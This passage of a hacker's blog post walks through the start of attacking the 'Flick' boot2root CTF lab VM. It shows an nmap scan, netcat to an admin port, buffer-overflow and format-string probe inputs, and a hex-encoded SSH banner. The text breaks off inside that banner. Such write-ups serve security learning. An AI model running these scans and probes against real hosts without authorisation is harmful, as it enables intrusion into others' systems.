
<!DOCTYPE HTML>
<html>
<head>
	<meta charset="utf-8">
	<title>How Many Hackers Does It Take To Change A Lightbulb ? - FourFourFourFour</title>
	<meta name="author" content="recrudesce">

	
	<meta name="description" content="Whilst in the middle of cracking Xerxes2, leonjza decided to release Flick - a CTF that is sure to tax minds.  Naturally I decided to make myself &hellip;">
	
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href="/atom.xml" rel="alternate" title="FourFourFourFour" type="application/atom+xml">
	<link rel="canonical" href="">
	<link href="/favicon.png" rel="shortcut icon">
	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
	<script async="true" src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
	
</head>


<body>
	<header id="header" class="inner"><h1><a href="/">FourFourFourFour</a></h1>
<nav id="main-nav"><ul class="main">
	<li><a href="/">Blog</a></li>
	<li><a href="/archives">Archives</a></li>
</ul>
</nav>
<nav id="mobile-nav">
	<div class="alignleft menu">
		<a class="button">Menu</a>
		<div class="container"><ul class="main">
	<li><a href="/">Blog</a></li>
	<li><a href="/archives">Archives</a></li>
</ul>
</div>
	</div>
	<div class="alignright search">
		<a class="button"></a>
		<div class="container">
			<form action="https://www.google.com/search" method="get">
				<input type="text" name="q" results="0">
				<input type="hidden" name="q" value="site:recrudesce.github.io">
			</form>
		</div>
	</div>
</nav>
<nav id="sub-nav" class="alignright">
	<div class="social">
		
		
		
		<a class="twitter" href="http://twitter.com/recrudesce" title="Twitter">Twitter</a>
		
		
    
		
		
		
		
		
		<a class="rss" href="/atom.xml" title="RSS">RSS</a>
		
    
	</div>
	<form class="search" action="https://www.google.com/search" method="get">
		<input class="alignright" type="text" name="q" results="0">
		<input type="hidden" name="q" value="site:recrudesce.github.io">
	</form>
</nav>

</header>
	
		
	
	<div id="content" class="inner"><article class="post">
	<h2 class="title">How Many Hackers Does It Take to Change a Lightbulb ?</h2>
	<div class="entry-content"><p>Whilst in the middle of cracking <a href="http://vulnhub.com/entry/xerxes-2,97/">Xerxes2</a>, <a href="https://twitter.com/leonjza">leonjza</a> decided to release <a href="http://vulnhub.com/entry/flick-1,99/">Flick</a> - a CTF that is sure to tax minds.  Naturally I decided to make myself feel like an unskilled loser, and downloaded it. Here&rsquo;s the story of how I rooted Flick first.</p>

<blockquote><p>root@flick:~# id<br/>uid=0(root) gid=0(root) groups=0(root)<br/>First ! [@leonjza](https://twitter.com/leonjza) [@VulnHub](https://twitter.com/VulnHub) [#flick](https://twitter.com/hashtag/flick?src=hash) [#boot2root](https://twitter.com/hashtag/boot2root?src=hash) [#vulnhub](https://twitter.com/hashtag/vulnhub?src=hash)</p><footer><strong>Russ Watts (@recrudesce) [August 12</strong> <cite>2014](https://twitter.com/recrudesce/statuses/499168321150124033)</cite></footer></blockquote>




<!-- more -->


<h2>&lsquo;Avin&rsquo; a Butchers</h2>

<p>Blah blah NMAP blah ;)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nmap -sS -O -p1-65535 -T4 192.168.0.106
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-08-08 22:39 BST
</span><span class='line'>Nmap scan report <span class="k">for</span> 192.168.0.106
</span><span class='line'>Host is up <span class="o">(</span>0.00s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">65533</span> closed ports
</span><span class='line'>PORT     STATE SERVICE VERSION
</span><span class='line'>22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">1024</span> 04:d0:8d:4d:ee:87:30:e7:60:82:63:d3:a8:6e:4b:ac <span class="o">(</span>DSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> 64:ec:a9:9b:0b:c0:11:d4:08:63:cf:83:e1:db:23:9a <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_  <span class="m">256</span> 2d:32:93:ce:0e:54:3f:84:ee:01:c7:c0:bb:68:e2:02 <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'>8881/tcp open  unknown
</span><span class='line'>
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'>Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></code></pre></td></tr></table></div></figure>


<p>SSH and a random unknown port - ominous. A quick netcat to the port presents us with a request for a password</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nc 192.168.0.106 8881
</span><span class='line'>Welcome to the admin server. A correct password will <span class="s1">&#39;flick&#39;</span> the switch and open a new door:
</span><span class='line'>&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Anything you type in just gets repeated back to you. I also checked for buffer overflows and format string vulns, but no avail - looks like I need a password.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Welcome to the admin server. A correct password will <span class="s1">&#39;flick&#39;</span> the switch and open a new door:
</span><span class='line'>&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span><span class='line'>OK: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span><span class='line'>
</span><span class='line'>&gt; %s%s%s%s
</span><span class='line'>OK: %s%s%s%s
</span><span class='line'>
</span><span class='line'>&gt; wut ?
</span><span class='line'>OK: wut ?
</span><span class='line'>
</span><span class='line'>&gt;
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://static.fjcdn.com/gifs/MFW+someone+tries+to+open+IE.+that+makes+me+a_c3c81f_4698730.gif" alt="" /> OK, so not knowing the password, I decided to check out SSH.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh blah@192.168.0.106
</span><span class='line'>
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>6d<span class="se">\x</span>30<span class="se">\x</span>77<span class="se">\x</span>64<span class="se">\x</span>32<span class="se">\x</span>51<span class="se">\x</span>79<span class="se">\x</span>55<span class="se">\x</span>58<span class="se">\x</span>6c<span class="se">\x</span>56<span class="se">\x</span>57<span class="se">\x</span>47<span class="se">\x</span>78<span class="se">\x</span>57<span class="se">\x</span>56<span class="se">\x</span>30<span class="se">\x</span>64<span class="se">\x</span>34
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>59<span class="se">\x</span>77<span class="se">\x</span>5a<span class="se">\x</span>44<span class="se">\x</span>52<span class="se">\x</span>57<span class="se">\x</span>4d<span class="se">\x</span>56<span class="se">\x</span>6c<span class="se">\x</span>33<span class="se">\x</span>57<span class="se">\x</span>6b<span class="se">\x</span>52<span class="se">\x</span>53<span class="se">\x</span>57<span class="se">\x</span>46<span class="se">\x</span>4a<span class="se">\x</span>74
</span><span class='line'><span class="se">\x</span>65<span class="se">\x</span>46<span class="se">\x</span>5a<span class="se">\x</span>56<span class="se">\x</span>4d<span class="se">\x</span>6a<span class="se">\x</span>41<span class="se">\x</span>31<span class="se">\x</span>56<span class="se">\x</span>6a<span class="se">\x</span>41<span class="se">\x</span>78<span class="se">\x</span>56<span class="se">\x</span>32<span class="se">\x</span>4a<span class="se">\x</span>45<span class="se">\x</span>54<span class="se">\x</span>6c<span class="se">\x</span>68<span class="se">\x</span>68
</span><span class='line'><span class="se">\x</span>4d<span class="se">\x</span>6b<span class="se">\x</span>30<span class="se">\x</span>78<span class="se">\x</span>56<span class="se">\x</span>6d<span class="se">\x</span>70<span class="se">\x</span>4b<span class="se">\x</span>53<span class="se">\x</span>31<span class="se">\x</span>49<span class="se">\x</span>79<span class="se">\x</span>53<span class="se">\x</span>6b<span class="se">\x</span>56<span class="se">\x</span>55<span class="se">\x</span>62<span class="se">\x</span>47<span class="se">\x</span>68<span class="se">\x</span>6f
</span><span class='line'><span class="se">\x</span>54<span class="se">\x</span>56<span class="se">\x</span>68<span class="se">\x</span>43<span class="se">\x</span>55<span class="se">\x</span>56<span class="se">\x</span>5a<span class="se">\x</span>74<span class="se">\x</span>65<span class="se">\x</span>46<span class="se">\x</span>5a<span class="se">\x</span>6c<span class="se">\x</span>52<span class="se">\x</span>6c<span class="se">\x</span>6c<span class="se">\x</span>35<span class="se">\x</span>56<span class="se">\x</span>47<span class="se">\x</span>74<span class="se">\x</span>73
</span><span class='line'><span class="se">\x</span>61<span class="se">\x</span>6c<span class="se">\x</span>4a<span class="se">\x</span>74<span class="se">\x</span>61<span class="se">\x</span>47<span class="se">\x</span>39<span class="se">\x</span>55<span class="se">\x</span>56<span class="se">\x</span>6d<span class="se">\x</span>68<span class="se">\x</span>44<span class="se">\x</span>56<span class="se">\x</span>56<span class="se">\x</span>5a<span class="se">\x</span>61<span class="se">\x</span>63<span class="se">\x</span>56<span class="se">\x</span>46<span class="se">\x</span>74
</span><span class='line'><span class="se">\x</span>52<span class="se">\x</span>6c<span class="se">\x</span>70<span class="se">\x</span>57<span class="se">\x</span>4d<span class="se">\x</span>44<span class="se">\x</span>45<span class="se">\x</span>31<span class="se">\x</span>56<span class="se">\x</span>54<span class="se">\x</span>4a<span class="se">\x</span>30<span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>58<span class="se">\x</span>53<span class="se">\x</span>6b<span class="se">\x</span>68<span class="se">\x</span>68
</span><span class='line'><span class="se">\x</span>52<span class="se">\x</span>7a<span class="se">\x</span>6c<span class="se">\x</span>56<span class="se">\x</span>56<span class="se">\x</span>6d<span class="se">\x</span>78<span class="se">\x</span>61<span class="se">\x</span>4d<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>73<span class="se">\x</span>57<span class="se">\x</span>6d<span class="se">\x</span>46<span class="se">\x</span>6b<span class="se">\x</span>52<span class="se">\x</span>30<span class="se">\x</span>35<span class="se">\x</span>47
</span><span class='line'><span class="se">\x</span>57<span class="se">\x</span>6b<span class="se">\x</span>5a<span class="se">\x</span>53<span class="se">\x</span>54<span class="se">\x</span>6d<span class="se">\x</span>46<span class="se">\x</span>36<span class="se">\x</span>52<span class="se">\x</span>54<span class="se">\x</span>46<span class="se">\x</span>57<span class="se">\x</span>56<span class="se">\x</span>45<span class="se">\x</span>6f<span class="se">\x</span>77<span class="se">\x</span>56<span class="se">\x</span>6a<span class="se">\x</span>46<span class="se">\x</span>61
</span><span class='line'><span class="se">\x</span>57<span class="se">\x</span>46<span class="se">\x</span>4e<span class="se">\x</span>72<span class="se">\x</span>61<span class="se">\x</span>47<span class="se">\x</span>68<span class="se">\x</span>53<span class="se">\x</span>65<span class="se">\x</span>6d<span class="se">\x</span>78<span class="se">\x</span>57<span class="se">\x</span>56<span class="se">\x</span>6d<span class="se">\x</span>70<span class="se">\x</span>4f<span class="se">\x</span>54<span class="se">\x</span>30<span class="se">\x</span>30<span class="se">\x</span>78
</span><span class='line'><span class="se">\x</span>63<span class="se">\x</span>46<span class="se">\x</span>5a<span class="se">\x</span>58<span class="se">\x</span>62<span class="se">\x</span>55<span class="se">\x</span>5a<span class="se">\x</span>72<span class="se">\x</span>55<span class="se">\x</span>6a<span class="se">\x</span>41<span class="se">\x</span>31<span class="se">\x</span>52<span class="se">\x</span>31<span class="se">\x</span>64<span class="se">\x</span>72<span class="se">\x</span>57<span class="se">\x</span>6e<span class="se">\x</span>64<span class="se">\x</span>57
</span><span class='line'><span class="se">\x</span>4d<span class="se">\x</span>44<span class="se">\x</span>46<span class="se">\x</span>46<span class="se">\x</span>55<span class="se">\x</span>6c<span class="se">\x</span>52<span class="se">\x</span>47<span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>46<span class="se">\x</span>62<span class="se">\x</span>33<span class="se">\x</span>64<span class="se">\x</span>57<span class="se">\x</span>61<span class="se">\x</span>6b<span class="se">\x</span>5a<span class="se">\x</span>68
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>30<span class="se">\x</span>5a<span class="se">\x</span>4f<span class="se">\x</span>63<span class="se">\x</span>6d<span class="se">\x</span>46<span class="se">\x</span>48<span class="se">\x</span>61<span class="se">\x</span>46<span class="se">\x</span>4e<span class="se">\x</span>6c<span class="se">\x</span>62<span class="se">\x</span>58<span class="se">\x</span>68<span class="se">\x</span>58<span class="se">\x</span>56<span class="se">\x</span>6d<span class="se">\x</span>30<span class="se">\x</span>78
</span><span class='line'><span class="se">\x</span>4e<span class="se">\x</span>46<span class="se">\x</span>6c<span class="se">\x</span>56<span class="se">\x</span>4d<span class="se">\x</span>48<span class="se">\x</span>68<span class="se">\x</span>58<span class="se">\x</span>62<span class="se">\x</span>6b<span class="se">\x</span>35<span class="se">\x</span>59<span class="se">\x</span>59<span class="se">\x</span>6c<span class="se">\x</span>56<span class="se">\x</span>61<span class="se">\x</span>63<span class="se">\x</span>6c<span class="se">\x</span>56<span class="se">\x</span>71
</span><span class='line'><span class="se">\x</span>51<span class="se">\x</span>54<span class="se">\x</span>46<span class="se">\x</span>53<span class="se">\x</span>4d<span class="se">\x</span>57<span class="se">\x</span>52<span class="se">\x</span>79<span class="se">\x</span>56<span class="se">\x</span>32<span class="se">\x</span>78<span class="se">\x</span>4f<span class="se">\x</span>56<span class="se">\x</span>57<span class="se">\x</span>4a<span class="se">\x</span>56<span class="se">\x</span>63<span class="se">\x</span>45<span class="se">\x</span>64<span class="se">\x</span>5a
</span><span class='line'><span class="se">\x</span>4d<span class="se">\x</span>46<span class="se">\x</span>5a<span class="se">\x</span>33<span class="se">\x</span>56<span class="se">\x</span>6a<span class="se">\x</span>4a<span class="se">\x</span>4b<span class="se">\x</span>56<span class="se">\x</span>56<span class="se">\x</span>4a<span class="se">\x</span>59<span class="se">\x</span>5a<span class="se">\x</span>46<span class="se">\x</span>70<span class="se">\x</span>6c<span class="se">\x</span>61<span class="se">\x</span>33<span class="se">\x</span>42<span class="se">\x</span>49
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>6d<span class="se">\x</span>70<span class="se">\x</span>47<span class="se">\x</span>54<span class="se">\x</span>32<span class="se">\x</span>52<span class="se">\x</span>57<span class="se">\x</span>56<span class="se">\x</span>6e<span class="se">\x</span>52<span class="se">\x</span>68<span class="se">\x</span>52<span class="se">\x</span>6b<span class="se">\x</span>35<span class="se">\x</span>73<span class="se">\x</span>59<span class="se">\x</span>6c<span class="se">\x</span>68<span class="se">\x</span>6f
</span><span class='line'><span class="se">\x</span>57<span class="se">\x</span>46<span class="se">\x</span>5a<span class="se">\x</span>74<span class="se">\x</span>4d<span class="se">\x</span>58<span class="se">\x</span>64<span class="se">\x</span>55<span class="se">\x</span>4d<span class="se">\x</span>56<span class="se">\x</span>46<span class="se">\x</span>33<span class="se">\x</span>54<span class="se">\x</span>55<span class="se">\x</span>68<span class="se">\x</span>6f<span class="se">\x</span>61<span class="se">\x</span>6c<span class="se">\x</span>4a<span class="se">\x</span>73
</span><span class='line'><span class="se">\x</span>63<span class="se">\x</span>46<span class="se">\x</span>6c<span class="se">\x</span>5a<span class="se">\x</span>62<span class="se">\x</span>46<span class="se">\x</span>5a<span class="se">\x</span>68<span class="se">\x</span>59<span class="se">\x</span>32<span class="se">\x</span>78<span class="se">\x</span>57<span class="se">\x</span>63<span class="se">\x</span>56<span class="se">\x</span>46<span class="se">\x</span>55<span class="se">\x</span>52<span class="se">\x</span>6c<span class="se">\x</span>4e<span class="se">\x</span>4e
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>6c<span class="se">\x</span>59<span class="se">\x</span>31<span class="se">\x</span>56<span class="se">\x</span>46<span class="se">\x</span>5a<span class="se">\x</span>53<span class="se">\x</span>55<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>72<span class="se">\x</span>4d<span class="se">\x</span>58<span class="se">\x</span>4a<span class="se">\x</span>6a<span class="se">\x</span>52<span class="se">\x</span>6d<span class="se">\x</span>68<span class="se">\x</span>57
</span><span class='line'><span class="se">\x</span>54<span class="se">\x</span>57<span class="se">\x</span>35<span class="se">\x</span>53<span class="se">\x</span>4d<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>71<span class="se">\x</span>53<span class="se">\x</span>6b<span class="se">\x</span>74<span class="se">\x</span>57<span class="se">\x</span>56<span class="se">\x</span>6b<span class="se">\x</span>70<span class="se">\x</span>5a<span class="se">\x</span>57<span class="se">\x</span>6b<span class="se">\x</span>5a<span class="se">\x</span>77
</span><span class='line'><span class="se">\x</span>62<span class="se">\x</span>47<span class="se">\x</span>45<span class="se">\x</span>7a<span class="se">\x</span>51<span class="se">\x</span>6b<span class="se">\x</span>6c<span class="se">\x</span>57<span class="se">\x</span>62<span class="se">\x</span>58<span class="se">\x</span>42<span class="se">\x</span>48<span class="se">\x</span>56<span class="se">\x</span>44<span class="se">\x</span>4a<span class="se">\x</span>53<span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>75
</span><span class='line'><span class="se">\x</span>55<span class="se">\x</span>6d<span class="se">\x</span>68<span class="se">\x</span>53<span class="se">\x</span>61<span class="se">\x</span>7a<span class="se">\x</span>56<span class="se">\x</span>7a<span class="se">\x</span>57<span class="se">\x</span>57<span class="se">\x</span>78<span class="se">\x</span>6f<span class="se">\x</span>62<span class="se">\x</span>31<span class="se">\x</span>64<span class="se">\x</span>47<span class="se">\x</span>57<span class="se">\x</span>6e<span class="se">\x</span>52<span class="se">\x</span>4e
</span><span class='line'><span class="se">\x</span>53<span class="se">\x</span>47<span class="se">\x</span>68<span class="se">\x</span>50<span class="se">\x</span>55<span class="se">\x</span>6d<span class="se">\x</span>31<span class="se">\x</span>34<span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>52<span class="se">\x</span>56<span class="se">\x</span>61<span class="se">\x</span>47<span class="se">\x</span>39<span class="se">\x</span>58<span class="se">\x</span>52<span class="se">\x</span>30<span class="se">\x</span>70<span class="se">\x</span>79
</span><span class='line'><span class="se">\x</span>54<span class="se">\x</span>6c<span class="se">\x</span>5a<span class="se">\x</span>73<span class="se">\x</span>57<span class="se">\x</span>6d<span class="se">\x</span>4a<span class="se">\x</span>47<span class="se">\x</span>57<span class="se">\x</span>6d<span class="se">\x</span>68<span class="se">\x</span>5a<span class="se">\x</span>4d<span class="se">\x</span>6e<span class="se">\x</span>68<span class="se">\x</span>58<span class="se">\x</span>59<span class="se">\x</span>7a<span class="se">\x</span>46<span class="se">\x</span>57
</span><span class='line'><span class="se">\x</span>63<span class="se">\x</span>6c<span class="se">\x</span>70<span class="se">\x</span>47<span class="se">\x</span>61<span class="se">\x</span>47<span class="se">\x</span>6c<span class="se">\x</span>53<span class="se">\x</span>4d<span class="se">\x</span>31<span class="se">\x</span>46<span class="se">\x</span>36<span class="se">\x</span>56<span class="se">\x</span>6a<span class="se">\x</span>4a<span class="se">\x</span>30<span class="se">\x</span>55<span class="se">\x</span>31<span class="se">\x</span>55<span class="se">\x</span>78
</span><span class='line'><span class="se">\x</span>57<span class="se">\x</span>6e<span class="se">\x</span>4a<span class="se">\x</span>4e<span class="se">\x</span>57<span class="se">\x</span>45<span class="se">\x</span>70<span class="se">\x</span>71<span class="se">\x</span>55<span class="se">\x</span>6d<span class="se">\x</span>31<span class="se">\x</span>6f<span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>52<span class="se">\x</span>58<span class="se">\x</span>4e<span class="se">\x</span>56<span class="se">\x</span>4e<span class="se">\x</span>4e
</span><span class='line'><span class="se">\x</span>4d<span class="se">\x</span>56<span class="se">\x</span>70<span class="se">\x</span>78<span class="se">\x</span>55<span class="se">\x</span>32<span class="se">\x</span>74<span class="se">\x</span>30<span class="se">\x</span>56<span class="se">\x</span>31<span class="se">\x</span>5a<span class="se">\x</span>72<span class="se">\x</span>63<span class="se">\x</span>46<span class="se">\x</span>70<span class="se">\x</span>58<span class="se">\x</span>61<span class="se">\x</span>31<span class="se">\x</span>70<span class="se">\x</span>33
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>6a<span class="se">\x</span>46<span class="se">\x</span>4b<span class="se">\x</span>56<span class="se">\x</span>32<span class="se">\x</span>4e<span class="se">\x</span>49<span class="se">\x</span>62<span class="se">\x</span>46<span class="se">\x</span>64<span class="se">\x</span>57<span class="se">\x</span>52<span class="se">\x</span>55<span class="se">\x</span>70<span class="se">\x</span>6f<span class="se">\x</span>56<span class="se">\x</span>6b<span class="se">\x</span>52<span class="se">\x</span>4b
</span><span class='line'><span class="se">\x</span>54<span class="se">\x</span>32<span class="se">\x</span>52<span class="se">\x</span>47<span class="se">\x</span>53<span class="se">\x</span>6e<span class="se">\x</span>4a<span class="se">\x</span>61<span class="se">\x</span>52<span class="se">\x</span>6d<span class="se">\x</span>68<span class="se">\x</span>70<span class="se">\x</span>56<span class="se">\x</span>6a<span class="se">\x</span>4e<span class="se">\x</span>6f<span class="se">\x</span>56<span class="se">\x</span>56<span class="se">\x</span>64<span class="se">\x</span>57
</span><span class='line'><span class="se">\x</span>55<span class="se">\x</span>6b<span class="se">\x</span>39<span class="se">\x</span>52<span class="se">\x</span>4d<span class="se">\x</span>57<span class="se">\x</span>52<span class="se">\x</span>48<span class="se">\x</span>56<span class="se">\x</span>32<span class="se">\x</span>35<span class="se">\x</span>53<span class="se">\x</span>54<span class="se">\x</span>6c<span class="se">\x</span>5a<span class="se">\x</span>46<span class="se">\x</span>53<span class="se">\x</span>6c<span class="se">\x</span>68<span class="se">\x</span>55
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>33<span class="se">\x</span>68<span class="se">\x</span>48<span class="se">\x</span>54<span class="se">\x</span>6c<span class="se">\x</span>5a<span class="se">\x</span>61<span class="se">\x</span>57<span class="se">\x</span>45<span class="se">\x</span>35<span class="se">\x</span>56<span class="se">\x</span>4f<span class="se">\x</span>56<span class="se">\x</span>68<span class="se">\x</span>53<span class="se">\x</span>4d<span class="se">\x</span>48<span class="se">\x</span>42<span class="se">\x</span>4a
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>6c<span class="se">\x</span>64<span class="se">\x</span>34<span class="se">\x</span>63<span class="se">\x</span>31<span class="se">\x</span>64<span class="se">\x</span>74<span class="se">\x</span>53<span class="se">\x</span>6b<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>52<span class="se">\x</span>6c<span class="se">\x</span>4a<span class="se">\x</span>58<span class="se">\x</span>54<span class="se">\x</span>55<span class="se">\x</span>5a<span class="se">\x</span>77
</span><span class='line'><span class="se">\x</span>56<span class="se">\x</span>46<span class="se">\x</span>5a<span class="se">\x</span>71<span class="se">\x</span>52<span class="se">\x</span>6e<span class="se">\x</span>64<span class="se">\x</span>53<span class="se">\x</span>4d<span class="se">\x</span>56<span class="se">\x</span>4a<span class="se">\x</span>30<span class="se">\x</span>5a<span class="se">\x</span>55<span class="se">\x</span>64<span class="se">\x</span>73<span class="se">\x</span>55<span class="se">\x</span>32<span class="se">\x</span>4a<span class="se">\x</span>59
</span><span class='line'><span class="se">\x</span>59<span class="se">\x</span>33<span class="se">\x</span>68<span class="se">\x</span>57<span class="se">\x</span>61<span class="se">\x</span>31<span class="se">\x</span>70<span class="se">\x</span>68<span class="se">\x</span>56<span class="se">\x</span>54<span class="se">\x</span>46<span class="se">\x</span>56<span class="se">\x</span>65<span class="se">\x</span>46<span class="se">\x</span>64<span class="se">\x</span>75<span class="se">\x</span>53<span class="se">\x</span>6b<span class="se">\x</span>35<span class="se">\x</span>58
</span><span class='line'><span class="se">\x</span>52<span class="se">\x</span>58<span class="se">\x</span>42<span class="se">\x</span>78<span class="se">\x</span>56<span class="se">\x</span>57<span class="se">\x</span>78<span class="se">\x</span>6b<span class="se">\x</span>4e<span class="se">\x</span>47<span class="se">\x</span>46<span class="se">\x</span>47<span class="se">\x</span>56<span class="se">\x</span>58<span class="se">\x</span>64<span class="se">\x</span>68<span class="se">\x</span>52<span class="se">\x</span>55<span class="se">\x</span>35<span class="se">\x</span>55
</span><span class='line'><span class="se">\x</span>55<span class="se">\x</span>6d<span class="se">\x</span>78<span class="se">\x</span>77<span class="se">\x</span>65<span class="se">\x</span>46<span class="se">\x</span>55<span class="se">\x</span>79<span class="se">\x</span>64<span class="se">\x</span>47<span class="se">\x</span>46<span class="se">\x</span>69<span class="se">\x</span>52<span class="se">\x</span>6c<span class="se">\x</span>70<span class="se">\x</span>7a<span class="se">\x</span>56<span class="se">\x</span>32<span class="se">\x</span>78<span class="se">\x</span>77
